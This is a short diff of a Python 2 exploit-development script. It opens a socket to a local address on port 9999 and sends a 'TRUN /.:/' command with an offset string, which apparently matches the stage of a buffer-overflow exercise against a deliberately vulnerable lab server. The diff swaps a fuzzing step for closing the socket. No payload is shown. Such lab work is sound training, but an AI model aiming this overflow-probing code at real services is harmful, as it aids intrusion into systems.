@@ -9,8 +9,8 @@ try:
         s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect(('192.168.1.130', 9999)) #This is the address and port of the target machine
         s.send(('TRUN /.:/' + offset))
-        sleep(1)
-        buffer = buffer + "A" * 100
+        s.close()
+
 
 except:
         print "Error connecting to server"
